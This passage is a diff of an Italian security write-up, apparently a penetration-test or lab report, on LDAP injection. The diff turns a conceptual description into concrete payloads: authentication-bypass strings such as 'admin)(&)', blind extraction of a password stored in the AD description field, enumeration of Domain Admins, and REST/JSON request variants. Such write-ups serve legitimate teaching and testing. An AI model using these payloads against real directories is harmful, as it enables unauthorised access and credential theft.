@@ -48,30 +48,51 @@ Un filtro di autenticazione tipico ha questa forma (notazione prefissa, con AND 
 Il test consiste nell'inviare la wildcard `*` come nome utente e osservare se la risposta cambia (es. un errore
 diverso, o "utenti multipli trovati"). Un cambiamento indica che l'input raggiunge il filtro senza escape.
 
-### Fase 2 - Bypass dell'autenticazione (concettuale)
+### Fase 2 - Bypass dell'autenticazione
 
-La tecnica consiste nell'iniettare metacaratteri che chiudono prematuramente il filtro e introducono una
-condizione sempre vera, rendendo irrilevante il campo password. In forma didattica minima:
+Si iniettano metacaratteri che chiudono prematuramente il filtro e introducono una condizione sempre vera,
+rendendo irrilevante la password. Payload nel campo username (password qualsiasi):
 
 ```
-Nome utente: *                       <-- la wildcard matcha tutti gli utenti
-# il filtro, non sanitizzato, autentica il primo utente che corrisponde (spesso un admin)
+*                       <-- wildcard: matcha tutti gli utenti, autentica il primo (spesso admin)
+admin)(&)               <-- chiusura + (&) sempre-vero
+admin))(|(uid=*         <-- OR injection: forza la clausola a TRUE
+*)(uid=*))(|(uid=*      <-- variante OR con wildcard
 ```
 
-Le varianti (chiusura con `)(` e introduzione di un OR o di una condizione tautologica) sono molteplici; il
-principio e sempre lo stesso: l'input, non trattato come dato, altera la struttura logica del filtro.
+Esempio di come `admin)(&)` altera il filtro vulnerabile `(&(uid=INPUT)(userPassword=PASS))`:
+
+```
+(&(uid=admin)(&))(userPassword=PASS))
+         ^^^^  la sotto-clausola (&) e sempre vera; la password non viene piu valutata
+```
 
 ### Fase 3 - Enumerazione ed estrazione (blind)
 
-Se l'applicazione risponde in modo diverso a condizioni vere e false, si enumerano gli utenti per prefisso
-(`a*`, `ad*`, `adm*`...) e si estraggono gli attributi un carattere alla volta. L'attributo di maggior valore in
-AD e `description`, dove e pratica (pessima ma diffusa) annotare password temporanee.
-
-Output illustrativo (rappresentativo, esito dell'enumerazione):
+Se l'applicazione risponde in modo diverso a condizioni vere e false, si enumerano gli utenti per prefisso e si
+estraggono gli attributi un carattere alla volta. L'attributo di maggior valore in AD e `description`, dove e
+pratica (pessima ma diffusa) annotare password temporanee.
 
 ```
-a*   -> comportamento "password errata"   <-- esistono utenti che iniziano per 'a'
-b*   -> comportamento "utente inesistente" <-- nessun utente inizia per 'b'
+# Enumerazione utenti per prefisso (nel campo username)
+a*     -> "password errata"     <-- esistono utenti che iniziano per 'a'
+b*     -> "utente inesistente"  <-- nessun utente inizia per 'b'
+adm*   -> "password errata"     <-- esiste 'admin' o simili
+
+# Estrazione blind del campo description di 'admin', carattere per carattere
+admin)(description=P*       -> TRUE   <-- la description inizia per 'P'
+admin)(description=Pass*    -> TRUE
+admin)(description=Password1*  -> TRUE ... fino alla stringa completa
+
+# Enumerazione dei membri di un gruppo privilegiato (via ricerca)
+*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local   <-- elenca i Domain Admin
+```
+
+Variante API/JSON (backend LDAP dietro un endpoint REST):
+
+```
+POST /api/v2/auth/login    {"username": "admin)(&)", "password": "x"}
+POST /api/v2/users/search  {"query": "*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local"}
 ```
 
 ## Analisi dei risultati
